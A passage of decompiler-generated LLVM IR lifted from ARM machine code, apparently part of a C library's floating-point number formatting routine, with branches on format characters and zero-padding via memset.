  store i1 %v6_145ac, i1* %cpsr_n.global-to-local, align 1
  %v7_145ac = icmp eq i32 %v0_145a8, 0
  store i1 %v7_145ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_145ac, label %dec_label_pc_14538, label %dec_label_pc_145b4

dec_label_pc_145b4:                               ; preds = %dec_label_pc_145a8
  %v0_145b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_145b4 = add i32 %v0_145b4, -96
  %v3_145b4 = sub i32 95, %v0_145b4
  %v4_145b4 = and i32 %v3_145b4, %v0_145b4
  %v5_145b4 = icmp slt i32 %v4_145b4, 0
  store i1 %v5_145b4, i1* %cpsr_v.global-to-local, align 1
  %v6_145b4 = icmp slt i32 %v1_145b4, 0
  store i1 %v6_145b4, i1* %cpsr_n.global-to-local, align 1
  %v7_145b4 = icmp eq i32 %v0_145b4, 96
  store i1 %v7_145b4, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_145b4, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_145b4
  %v5_145c0 = add i32 %v0_145b4, 32
  store i32 %v5_145c0, i32* %r3.global-to-local, align 4
  %v5_145c4 = urem i32 %v5_145c0, 256
  store i32 %v5_145c4, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_145b4, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_145b4 ]
  %v0_145e4 = phi i32 [ %v5_145c4, %bb188 ], [ %v0_145b4, %dec_label_pc_145b4 ]
  %v7_145c8 = icmp eq i32 %v0_145e4, 103
  %.229 = zext i1 %v7_145c8 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_145d4 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_145d4 = icmp slt i32 %v0_145d4, 0
  store i1 %v1_145d4, i1* %cpsr_n.global-to-local, align 1
  %v2_145d4 = icmp eq i32 %v0_145d4, 0
  store i1 %v2_145d4, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_145d4, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_145dc = icmp eq i1 %v7_145c8, false
  store i1 %v2_145dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_145dc, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_145e0 = add i32 %v0_145d4, -1
  store i32 %v2_145e0, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_145f0 = phi i32 [ %v0_145d4, %.thread13 ], [ %v0_145d4, %bb192 ], [ %v2_145e0, %bb193 ]
  %v1_145e4 = add i32 %v0_145e4, -102
  %v3_145e4 = sub i32 101, %v0_145e4
  %v4_145e4 = and i32 %v3_145e4, %v0_145e4
  %v5_145e4 = icmp slt i32 %v4_145e4, 0
  store i1 %v5_145e4, i1* %cpsr_v.global-to-local, align 1
  %v6_145e4 = icmp slt i32 %v1_145e4, 0
  store i1 %v6_145e4, i1* %cpsr_n.global-to-local, align 1
  %v7_145e4 = icmp eq i32 %v0_145e4, 102
  store i1 %v7_145e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_145e4, label %dec_label_pc_145f0, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_145f0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14614

dec_label_pc_145f0:                               ; preds = %bb194
  %v1_145f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_145f0 = add i32 %v1_145f0, %v0_145f0
  store i32 %v2_145f0, i32* %ip.global-to-local, align 4
  %v2_145f4 = add i32 %v2_145f0, 1
  %v4_145f4 = sub i32 0, %v2_145f0
  %v5_145f4 = and i32 %v2_145f4, %v4_145f4
  %v6_145f4 = icmp slt i32 %v5_145f4, 0
  store i1 %v6_145f4, i1* %cpsr_v.global-to-local, align 1
  %v7_145f4 = icmp slt i32 %v2_145f4, 0
  store i1 %v7_145f4, i1* %cpsr_n.global-to-local, align 1
  %v8_145f4 = icmp eq i32 %v2_145f4, 0
  store i1 %v8_145f4, i1* %cpsr_z.global-to-local, align 1
  %v6_145f8 = icmp slt i32 %v2_145f0, -1
  br i1 %v6_145f8, label %dec_label_pc_145fc, label %dec_label_pc_14614

dec_label_pc_145fc:                               ; preds = %dec_label_pc_145f0
  %v2_145fc = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_145fc, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_14608 = bitcast i32* %stack_var_-87 to i8*
  %v3_14608 = call i32 @__GI_memset(i8* %v2_14608, i32 48)
  store i32 %v3_14608, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14614

dec_label_pc_14614:                               ; preds = %dec_label_pc_145f0, %bb195, %dec_label_pc_145fc
  %v1_1465869 = phi i32 [ %v2_14598, %bb195 ], [ %v3_14608, %dec_label_pc_145fc ], [ %v2_14598, %dec_label_pc_145f0 ]
  %v1_1463c = phi i32 [ %v0_145f0, %bb195 ], [ -1, %dec_label_pc_145fc ], [ %v2_145f0, %dec_label_pc_145f0 ]
  %v1_14618 = add i32 %v1_1463c, -16
  %v3_14618 = sub i32 15, %v1_1463c
  %v4_14618 = and i32 %v3_14618, %v1_1463c
  %v5_14618 = icmp slt i32 %v4_14618, 0
  store i1 %v5_14618, i1* %cpsr_v.global-to-local, align 1
  %v6_14618 = icmp slt i32 %v1_14618, 0
  store i1 %v6_14618, i1* %cpsr_n.global-to-local, align 1
  %v7_14618 = icmp eq i32 %v1_1463c, 16
  store i1 %v7_14618, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_14624 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_14624, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_1462c = icmp sgt i32 %v1_1463c, 16
  br i1 %v7_1462c, label %.thread18, label %dec_label_pc_14638

.thread18:                                        ; preds = %dec_label_pc_14614
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_14630 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_14630, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_14638:                               ; preds = %dec_label_pc_14614
  %v2_14638 = ptrtoint i32* %stack_var_-86 to i32
  %v2_1463c = add i32 %v1_1463c, %v2_14638
  store i32 %v2_1463c, i32* %r3.global-to-local, align 4
  %v1_14640 = add i32 %v2_1463c, 2
  %v2_14640 = inttoptr i32 %v1_14640 to i8*
  %v3_14640 = load i8, i8* %v2_14640, align 1
  %v4_14640 = zext i8 %v3_14640 to i32
  store i32 %v4_14640, i32* %r2.global-to-local, align 4
  store i32 %v1_14640, i32* %r1.global-to-local, align 4
  %v2_14648 = icmp ugt i8 %v3_14640, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14648 = icmp ult i8 %v3_14640, 52
  store i1 %v6_14648, i1* %cpsr_n.global-to-local, align 1
  %v7_14648 = icmp eq i8 %v3_14640, 52
  store i1 %v7_14648, i1* %cpsr_z.global-to-local, align 1
  %v2_1464c = xor i1 %v2_14648, true
  %v3_1464c = or i1 %v7_14648, %v2_1464c
  br i1 %v3_1464c, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_14638
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_14638, %bb196
  %v1_1465868 = phi i32 [ %v1_1465869, %dec_label_pc_14638 ], [ 0, %bb196 ]
  %v2_14650 = xor i1 %v7_14648, true
  %v3_14650 = and i1 %v2_14648, %v2_14650
  br i1 %v3_14650, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_14658 = phi i32 [ %v1_14658.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_1465868, %bb197 ], [ 1, %bb198 ]
  %v0_14654 = phi i32 [ %v0_14660, %.backedge ], [ %v10_14630, %.thread18 ], [ %v1_14640, %bb197 ], [ %v1_14640, %bb198 ]
  %v1_14654 = add i32 %v0_14654, -1
  %v2_14654 = inttoptr i32 %v1_14654 to i8*
  %v3_14654 = load i8, i8* %v2_14654, align 1
  %v4_14654 = zext i8 %v3_14654 to i32
  store i32 %v1_14654, i32* %r1.global-to-local, align 4
  %v2_14658 = add i32 %v4_14654, %v1_14658
  store i32 %v2_14658, i32* %r3.global-to-local, align 4
  %v1_1465c = trunc i32 %v2_14658 to i8
  store i8 %v1_1465c, i8* %v2_14654, align 1
  %v0_14660 = load i32, i32* %r1.global-to-local, align 4
  %v1_14660 = inttoptr i32 %v0_14660 to i8*
  %v2_14660 = load i8, i8* %v1_14660, align 1
  %v3_14660 = zext i8 %v2_14660 to i32
  store i32 %v3_14660, i32* %r2.global-to-local, align 4
  %v2_14664 = icmp ugt i8 %v2_14660, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14664 = icmp ult i8 %v2_14660, 57
  store i1 %v6_14664, i1* %cpsr_n.global-to-local, align 1
  %v7_14664 = icmp eq i8 %v2_14660, 57
  store i1 %v7_14664, i1* %cpsr_z.global-to-local, align 1
  %v2_14668 = xor i1 %v2_14664, true
  %v3_14668 = or i1 %v7_14664, %v2_14668
  br i1 %v3_14668, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_1466c = xor i1 %v7_14664, true
  %v3_1466c = and i1 %v2_14664, %v2_1466c
  br i1 %v3_1466c, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_14674.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_14674 = phi i32 [ %v1_14674.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_14670 = icmp ult i8 %v2_14660, 48
  store i1 %v6_14670, i1* %cpsr_n.global-to-local, align 1
  %v7_14670 = icmp eq i8 %v2_14660, 48
  store i1 %v7_14670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14670, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_14674 = or i32 %v1_14674, 1
  store i32 %v2_14674, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1467821 = icmp slt i32 %v2_14674, 0
  store i1 %v1_1467821, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14678 = icmp slt i32 %v1_14674, 0
  store i1 %v1_14678, i1* %cpsr_n.global-to-local, align 1
  %v2_14678 = icmp eq i32 %v1_14674, 0
  store i1 %v2_14678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14678, label %dec_label_pc_14680, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_14658.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_14680:                               ; preds = %bb203
  store i32 %v2_14624, i32* %r2.global-to-local, align 4
  %v2_14684 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_14684, i32* %r3.global-to-local, align 4
  %v2_14688 = sub i32 %v0_14660, %v2_14684
  %v3_14688 = icmp uge i32 %v0_14660, %v2_14684
  %v4_14688 = xor i32 %v0_14660, %v2_14684
  %v5_14688 = xor i32 %v2_14688, %v0_14660
  %v6_14688 = and i32 %v5_14688, %v4_14688
  %v7_14688 = icmp slt i32 %v6_14688, 0
  store i1 %v7_14688, i1* %cpsr_v.global-to-local, align 1
  %v8_14688 = icmp slt i32 %v2_14688, 0
  store i1 %v8_14688, i1* %cpsr_n.global-to-local, align 1
  %v9_14688 = icmp eq i32 %v0_14660, %v2_14684
  store i1 %v9_14688, i1* %cpsr_z.global-to-local, align 1
  %v2_1468c = xor i1 %v3_14688, true
  %v3_1468c = or i1 %v9_14688, %v2_1468c
  br i1 %v3_1468c, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_14680
  store i32 %v2_14684, i32* %r2.global-to-local, align 4
  store i32 %v2_14684, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_14680, %bb204
  %v2_146a8 = phi i32 [ %v2_14684, %bb204 ], [ %v0_14660, %dec_label_pc_14680 ]
  %v4_14698123 = phi i32 [ %v2_14684, %bb204 ], [ %v2_14624, %dec_label_pc_14680 ]
  %v2_14694 = xor i1 %v9_14688, true
  %v3_14694 = and i1 %v3_14688, %v2_14694
  br i1 %v3_14694, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_14694 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_14694, i32* %r0.global-to-local, align 4
  %v5_14698 = add i32 %v4_14698123, 2
  store i32 %v5_14698, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_1468c, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_1469c = load i32, i32* %sb.global-to-local, align 4
  %v5_1469c = add i32 %v4_1469c, 1
  store i32 %v5_1469c, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_146a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_146a4 = add i32 %v0_146a4, -103
  %v3_146a4 = sub i32 102, %v0_146a4
  %v4_146a4 = and i32 %v3_146a4, %v0_146a4
  %v5_146a4 = icmp slt i32 %v4_146a4, 0
  store i1 %v5_146a4, i1* %cpsr_v.global-to-local, align 1
  %v6_146a4 = icmp slt i32 %v1_146a4, 0
  store i1 %v6_146a4, i1* %cpsr_n.global-to-local, align 1
  %v7_146a4 = icmp eq i32 %v0_146a4, 103
  store i1 %v7_146a4, i1* %cpsr_z.global-to-local, align 1
  %v3_146a8 = add i32 %v2_146a8, 1
  %v4_146a8 = inttoptr i32 %v3_146a8 to i8*
  store i8 0, i8* %v4_146a8, align 1
  %v0_146ac = load i32, i32* %r1.global-to-local, align 4
  %v1_146ac = add i32 %v0_146ac, 1
  store i32 %v1_146ac, i32* %r1.global-to-local, align 4
  %v0_146b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_146b0, label %bb208, label %dec_label_pc_146e0

bb208:                                            ; preds = %bb207
  %v0_146b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_146b4 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_146b8 = icmp sge i32 %v1_146b4, %v0_146b4
  %. = zext i1 %not.v7_146b8 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_146c0 = add i32 %v0_146b4, 4
  %v4_146c0 = sub i32 0, %v0_146b4
  %v5_146c0 = and i32 %v2_146c0, %v4_146c0
  %v6_146c0 = icmp slt i32 %v5_146c0, 0
  store i1 %v6_146c0, i1* %cpsr_v.global-to-local, align 1
  %v7_146c0 = icmp slt i32 %v2_146c0, 0
  store i1 %v7_146c0, i1* %cpsr_n.global-to-local, align 1
  %v8_146c0 = icmp eq i32 %v2_146c0, 0
  store i1 %v8_146c0, i1* %cpsr_z.global-to-local, align 1
  %v5_146c4 = icmp slt i32 %v0_146b4, -4
  br i1 %v5_146c4, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_146c8 = icmp eq i1 %not.v7_146b8, false
  store i1 %v2_146c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146c8, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_146cc29 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_146cc29, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_146ec

bb210:                                            ; preds = %bb209
  %v3_146d0 = sub i32 %v1_146b4, %v0_146b4
  store i32 %v3_146d0, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_146f8

dec_label_pc_146e0:                               ; preds = %bb207
  %v0_146e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_146e0 = add i32 %v0_146e0, -102
  %v3_146e0 = sub i32 101, %v0_146e0
  %v4_146e0 = and i32 %v3_146e0, %v0_146e0
  %v5_146e0 = icmp slt i32 %v4_146e0, 0
  store i1 %v5_146e0, i1* %cpsr_v.global-to-local, align 1
  %v6_146e0 = icmp slt i32 %v1_146e0, 0
  store i1 %v6_146e0, i1* %cpsr_n.global-to-local, align 1
  %v7_146e0 = icmp eq i32 %v0_146e0, 102
  store i1 %v7_146e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_146e0, i32* %sl.global-to-local, align 4
  br i1 %v7_146e0, label %dec_label_pc_146e0.dec_label_pc_146f8_crit_edge, label %dec_label_pc_146ec

dec_label_pc_146e0.dec_label_pc_146f8_crit_edge:  ; preds = %dec_label_pc_146e0
  %v0_146f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146f8

dec_label_pc_146ec:                               ; preds = %.thread, %dec_label_pc_146e0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14708

dec_label_pc_146f8:                               ; preds = %bb210, %dec_label_pc_146e0.dec_label_pc_146f8_crit_edge
  %v0_146f8 = phi i32 [ %v0_146f8.pre, %dec_label_pc_146e0.dec_label_pc_146f8_crit_edge ], [ %v0_146b4, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_146f8 = icmp slt i32 %v0_146f8, 0
  store i1 %v1_146f8, i1* %cpsr_n.global-to-local, align 1
  %v2_146f8 = icmp eq i32 %v0_146f8, 0
  store i1 %v2_146f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_146f8, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_146f8
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_14700 = load i32, i32* %r2.global-to-local, align 4
  %v6_14700 = add i32 %v5_14700, -1
  %v7_14700 = inttoptr i32 %v6_14700 to i8*
  store i8 48, i8* %v7_14700, align 1
  %v8_14700 = load i32, i32* %r2.global-to-local, align 4
  %v9_14700 = add i32 %v8_14700, -1
  store i32 %v9_14700, i32* %r2.global-to-local, align 4
  %v0_14704.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14734.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_14738.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14738.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_146f8, %bb211
  %v1_14738.pre = phi i1 [ %v1_14738.pre.pre, %bb211 ], [ false, %dec_label_pc_146f8 ]
  %v0_14738.pre = phi i1 [ %v0_14738.pre.pre, %bb211 ], [ false, %dec_label_pc_146f8 ]
  %v1_14734.pre = phi i32 [ %v1_14734.pre.pre, %bb211 ], [ %v1_146ac, %dec_label_pc_146f8 ]
  %v0_14704 = phi i32 [ %v0_14704.pre, %bb211 ], [ %v0_146f8, %dec_label_pc_146f8 ]
  store i32 %v0_14704, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14708

dec_label_pc_14708:                               ; preds = %dec_label_pc_146ec, %bb212
  %v0_147d8 = phi i32 [ 0, %dec_label_pc_146ec ], [ %v0_14704, %bb212 ]
  %v1_1473c = phi i1 [ false, %dec_label_pc_146ec ], [ %v1_14738.pre, %bb212 ]
  %v0_1473c = phi i1 [ false, %dec_label_pc_146ec ], [ %v0_14738.pre, %bb212 ]
  %v1_14734 = phi i32 [ %v1_146ac, %dec_label_pc_146ec ], [ %v1_14734.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_14714 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_14714, i32* %r3.global-to-local, align 4
  %v0_14720 = load i32, i32* %r2.global-to-local, align 4
  %v1_14720 = inttoptr i32 %v0_14720 to i8*
  %v2_14720 = load i8, i8* %v1_14720, align 1
  %v3_14720 = zext i8 %v2_14720 to i32
  store i32 %v3_14720, i32* %r3.global-to-local, align 4
  %v5_14720 = add i32 %v0_14720, 1
  store i32 %v5_14720, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_14720, i32* %stack_var_-46, align 4
  %v2_14734 = sub i32 %v1_14734, %v5_14720
  store i32 %v2_14734, i32* %r1.global-to-local, align 4
  %v2_14738 = xor i1 %v1_1473c, %v0_1473c
  br i1 %v2_14738, label %.thread127, label %dec_label_pc_14740

.thread127:                                       ; preds = %dec_label_pc_14708
  %v5_14738 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_14738, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_147e8

dec_label_pc_14740:                               ; preds = %dec_label_pc_14708
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_14744 = sub i32 %v0_147d8, %v2_14734
  %v4_14744 = xor i32 %v2_14734, %v0_147d8
  %v5_14744 = xor i32 %v2_14744, %v0_147d8
  %v6_14744 = and i32 %v5_14744, %v4_14744
  %v7_14744 = icmp slt i32 %v6_14744, 0
  store i1 %v7_14744, i1* %cpsr_v.global-to-local, align 1
  %v8_14744 = icmp slt i32 %v2_14744, 0
  store i1 %v8_14744, i1* %cpsr_n.global-to-local, align 1
  %v9_14744 = icmp eq i32 %v0_147d8, %v2_14734
  store i1 %v9_14744, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_14750 = xor i1 %v8_14744, %v7_14744
  br i1 %v2_14750, label %bb214, label %dec_label_pc_14754

dec_label_pc_14754:                               ; preds = %dec_label_pc_14740
  store i32 %v2_14744, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_14744, i1* %cpsr_n.global-to-local, align 1
  %v2_14758 = icmp eq i32 %v2_14744, 0
  store i1 %v2_14758, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_143b8, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_14744, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_1476c

.thread129:                                       ; preds = %dec_label_pc_14754
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_147e4

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14754
  store i32 ptrtoint (i32* @global_var_1afef.854 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_14778 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_14778, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_147e8

bb214:                                            ; preds = %dec_label_pc_14740
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_147c4 = icmp slt i32 %v0_147d8, 0
  store i1 %v1_147c4, i1* %cpsr_n.global-to-local, align 1
  %v2_147c4 = icmp eq i32 %v0_147d8, 0
  store i1 %v2_147c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_143b8, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_147d8, 1
  br i1 %tmp215, label %dec_label_pc_147e4, label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %bb214
  %v2_147d8 = sub i32 %v2_14734, %v0_147d8
  store i32 %v2_147d8, i32* %r1.global-to-local, align 4
  %v2_147dc = add i32 %v5_14720, %v0_147d8
  store i32 %v2_147dc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147e4

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147d4, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_147d4 ]
  %v0_147f882 = phi i32 [ %v2_14734, %bb214 ], [ 0, %.thread129 ], [ %v2_147d8, %dec_label_pc_147d4 ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_147e8

dec_label_pc_147e8:                               ; preds = %.thread127, %dec_label_pc_1476c, %dec_label_pc_147e4
  %v1_14818 = phi i32 [ %v2_14778, %dec_label_pc_1476c ], [ %storemerge141, %dec_label_pc_147e4 ], [ %v5_14738, %.thread127 ]
  %v0_1483090 = phi i32 [ -1, %dec_label_pc_1476c ], [ -1, %dec_label_pc_147e4 ], [ %v0_147d8, %.thread127 ]
  %v0_147f8 = phi i32 [ 0, %dec_label_pc_1476c ], [ %v0_147f882, %dec_label_pc_147e4 ], [ %v2_14734, %.thread127 ]
  %v0_147e8 = load i32, i32* %fp.global-to-local, align 4
  %v1_147e8 = add i32 %v0_147e8, 12
  %v2_147e8 = inttoptr i32 %v1_147e8 to i32*
  %v3_147e8 = load i32, i32* %v2_147e8, align 4
  %v1_147ec = and i32 %v3_147e8, 16
  store i32 %v1_147ec, i32* %lr.global-to-local, align 4
  %v2_147ec = icmp eq i32 %v1_147ec, 0
  %tmp238 = zext i1 %v2_147ec to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_147f8 = icmp slt i32 %v0_147f8, 0
  store i1 %v1_147f8, i1* %cpsr_n.global-to-local, align 1
  %v2_147f8 = icmp eq i32 %v0_147f8, 0
  store i1 %v2_147f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147f8, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_147e8
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14814

bb218:                                            ; preds = %dec_label_pc_147e8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_147ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147ec, label %dec_label_pc_14808, label %dec_label_pc_14814

dec_label_pc_14808:                               ; preds = %bb218
  %v0_14808 = load i32, i32* %r7.global-to-local, align 4
  %v1_14808 = add i32 %v0_14808, -103
  %v3_14808 = sub i32 102, %v0_14808
  %v4_14808 = and i32 %v3_14808, %v0_14808
  %v5_14808 = icmp slt i32 %v4_14808, 0
  store i1 %v5_14808, i1* %cpsr_v.global-to-local, align 1
  %v6_14808 = icmp slt i32 %v1_14808, 0
  store i1 %v6_14808, i1* %cpsr_n.global-to-local, align 1
  %v7_14808 = icmp eq i32 %v0_14808, 103
  store i1 %v7_14808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14808, label %dec_label_pc_14830, label %bb219

bb219:                                            ; preds = %dec_label_pc_14808
  %v1_1480c = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_1480c = icmp slt i32 %v1_1480c, 0
  store i1 %v2_1480c, i1* %cpsr_n.global-to-local, align 1
  %v3_1480c = icmp eq i32 %v1_1480c, 0
  store i1 %v3_1480c, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_1480c, 1
  br i1 %tmp220, label %dec_label_pc_14830, label %dec_label_pc_14814

dec_label_pc_14814:                               ; preds = %.thread33, %bb218, %bb219
  %v2_14818 = inttoptr i32 %v1_14818 to i32*
  store i32 112, i32* %v2_14818, align 4
  %v1_14820 = load i32, i32* %r6.global-to-local, align 4
  %v2_14820 = add i32 %v1_14820, 4
  %v3_14820 = inttoptr i32 %v2_14820 to i32*
  store i32 1, i32* %v3_14820, align 4
  store i32 ptrtoint (i32* @global_var_1affc.856 to i32), i32* %r3.global-to-local, align 4
  %v1_14828 = load i32, i32* %r6.global-to-local, align 4
  %v2_14828 = add i32 %v1_14828, 8
  %v3_14828 = inttoptr i32 %v2_14828 to i32*
  store i32 ptrtoint (i32* @global_var_1affc.856 to i32), i32* %v3_14828, align 4
